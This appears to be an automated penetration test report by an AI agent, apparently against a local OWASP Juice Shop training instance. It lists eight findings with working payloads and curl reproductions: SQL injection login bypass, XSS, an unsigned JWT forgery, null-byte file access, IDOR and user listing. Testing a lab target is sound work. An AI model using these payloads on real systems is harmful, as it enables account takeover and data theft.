# JuiceShark Penetration Test Findings Report

**Target:** http://localhost:3000  
**Date:** 2026-06-20 18:41 UTC  
**Agent:** JuiceShark (gpt-4o-mini)  
**Total Findings:** 8  
**Steps Executed:** 205  

---

## Executive Summary

| Severity | Count |
|----------|-------|
| 🔴 Critical | 4 |
| 🟠 High | 4 |

---

## Findings

### 1. 🔴 SQL Injection in Login Endpoint

| Field | Value |
|-------|-------|
| **ID** | `38c69aa0` |
| **Severity** | CRITICAL |
| **Type** | sqli |
| **Endpoint** | `POST /rest/user/login` |
| **Found by** | validator agent |
| **Timestamp** | 2026-06-20T18:38:58.236172+00:00 |

#### Payload

```
{"email":"' OR 1=1--","password":"anything"}
```

#### Evidence

```
200 OK with admin JWT
```

#### Validation Proof

Response contains a valid JWT token with admin user data.

#### Reproduction (curl)

```bash
curl -X POST http://localhost:3000/rest/user/login -H 'Content-Type: application/json' -d '{"email":"' OR 1=1--","password":"anything"}'
```

---

### 2. 🔴 XSS in Search Parameter

| Field | Value |
|-------|-------|
| **ID** | `219ac8c0` |
| **Severity** | CRITICAL |
| **Type** | xss |
| **Endpoint** | `GET /#/search` |
| **Found by** | validator agent |
| **Timestamp** | 2026-06-20T18:41:17.105146+00:00 |

#### Payload

```
<img src=x onerror=alert('XSS')>
```

#### Evidence

```
ALERTS TRIGGERED: ["XSS"]
```

#### Validation Proof

JavaScript alert() was triggered!

#### Reproduction (curl)

```bash
curl 'http://localhost:3000/#/search?q=<img src=x onerror=alert('XSS')>'
```

---

### 3. 🔴 Broken Authentication: Password Change Without Verification

| Field | Value |
|-------|-------|
| **ID** | `3bae8d03` |
| **Severity** | CRITICAL |
| **Type** | broken_auth |
| **Endpoint** | `GET /rest/user/change-password` |
| **Found by** | validator agent |
| **Timestamp** | 2026-06-20T18:41:37.903832+00:00 |

#### Payload

```
new=h@cked&repeat=h@cked
```

#### Evidence

```
HTTP 200 OK response with user data returned
```

#### Validation Proof

Password was updated without requiring the current password, which indicates a vulnerability in the authentication process.

#### Reproduction (curl)

```bash
curl -X GET 'http://localhost:3000/rest/user/change-password?new=h@cked&repeat=h@cked' -H 'Authorization: Bearer admin'
```

---

### 4. 🔴 JWT Manipulation Vulnerability

| Field | Value |
|-------|-------|
| **ID** | `c3757891` |
| **Severity** | CRITICAL |
| **Type** | jwt_manipulation |
| **Endpoint** | `POST /rest/user/login` |
| **Found by** | validator agent |
| **Timestamp** | 2026-06-20T18:41:46.853605+00:00 |

#### Payload

```

```

#### Evidence

```
CHALLENGE STATUS: {"jwtForgedChallenge": true, "jwtUnsignedChallenge": true}
```

#### Validation Proof

The script confirmed JWT manipulation with forged tokens accepted by the server.

#### Reproduction (curl)

```bash
curl -X POST http://localhost:3000/rest/user/login -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJqd3RuM2RAanVpY2Utc2gub3AiLCJyb2xlIjoiYWRtaW4ifSwiaWF0IjoxNzgxOTc5Mzg3fQ."
```

---

### 5. 🟠 Sensitive Data Exposure - Directory Listing of FTP Files

| Field | Value |
|-------|-------|
| **ID** | `97f014bf` |
| **Severity** | HIGH |
| **Type** | sensitive_data |
| **Endpoint** | `GET /ftp/` |
| **Found by** | validator agent |
| **Timestamp** | 2026-06-20T18:41:21.662366+00:00 |

#### Payload

```

```

#### Evidence

```
Response body contains a JSON list of filenames including sensitive files.
```

#### Validation Proof

The response contains a directory listing of files accessible without authentication, indicating a misconfiguration.

#### Reproduction (curl)

```bash
curl -X GET http://localhost:3000/ftp/
```

---

### 6. 🟠 Path Traversal in FTP

| Field | Value |
|-------|-------|
| **ID** | `29a8ccb0` |
| **Severity** | HIGH |
| **Type** | path_traversal |
| **Endpoint** | `GET /ftp/coupons_2013.md.bak%2500.md` |
| **Found by** | validator agent |
| **Timestamp** | 2026-06-20T18:41:24.767885+00:00 |

#### Payload

```

```

#### Evidence

```
HTTP 200 OK and returned binary file content
```

#### Validation Proof

The server returned a 200 status code for a request that should have been blocked, indicating successful path traversal.

#### Reproduction (curl)

```bash
curl -X GET http://localhost:3000/ftp/coupons_2013.md.bak%2500.md
```

---

### 7. 🟠 IDOR on Basket Endpoint

| Field | Value |
|-------|-------|
| **ID** | `0860bbd2` |
| **Severity** | HIGH |
| **Type** | idor |
| **Endpoint** | `GET /rest/basket/2` |
| **Found by** | validator agent |
| **Timestamp** | 2026-06-20T18:41:32.510606+00:00 |

#### Payload

```

```

#### Evidence

```
{"status":"success","data":{"id":2,"coupon":null,"UserId":2,"createdAt":"2026-06-20T17:07:18.219Z","updatedAt":"2026-06-20T17:07:18.219Z","Products":[{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"deluxePrice":4.99,"image":"raspberry_juice.jpg","createdAt":"2026-06-20T17:07:18.174Z","updatedAt":"2026-06-20T17:07:18.174Z","deletedAt":null,"BasketItem":{"ProductId":4,"BasketId":2,"id":4,"quantity":2,"createdAt":"2026-06-20T17:07:18.232Z","updatedAt":"2026-06-20T17:07:18.232Z"}}]}}
```

#### Validation Proof

Accessed another user's basket data with admin token, confirming IDOR vulnerability.

#### Reproduction (curl)

```bash
curl -X GET http://localhost:3000/rest/basket/2 -H 'Authorization: Bearer admin'
```

---

### 8. 🟠 Security Misconfiguration in User API

| Field | Value |
|-------|-------|
| **ID** | `6571d0e7` |
| **Severity** | HIGH |
| **Type** | misconfig |
| **Endpoint** | `GET /api/Users/` |
| **Found by** | validator agent |
| **Timestamp** | 2026-06-20T18:41:42.475742+00:00 |

#### Payload

```

```

#### Evidence

```
{"status":"success","data":[{"id":1,"email":"admin@juice-sh.op","role":"admin"},{"id":2,"email":"jim@juice-sh.op","role":"customer"},{"id":4,"email":"bjoern.kimminich@gmail.com","role":"admin"},{"id":6,"email":"support@juice-sh.op","role":"admin"}]}
```

#### Validation Proof

The API returned a complete list of all users including admin accounts, confirming that there are no access controls in place to restrict access to this endpoint.

#### Reproduction (curl)

```bash
curl -X GET http://localhost:3000/api/Users/ -H 'Authorization: Bearer admin'
```

---

## Test Coverage

- Endpoints discovered: 13
- Auth roles captured: admin
- Total agent steps: 205

### Vulnerability Categories Tested

| Category | Result |
|----------|--------|
| sqli | ✅ Found |
| xss | ✅ Found |
| idor | ✅ Found |
| jwt_manipulation | ✅ Found |
| path_traversal | ✅ Found |
| broken_auth | ✅ Found |
| misconfig | ✅ Found |
| sensitive_data | ✅ Found |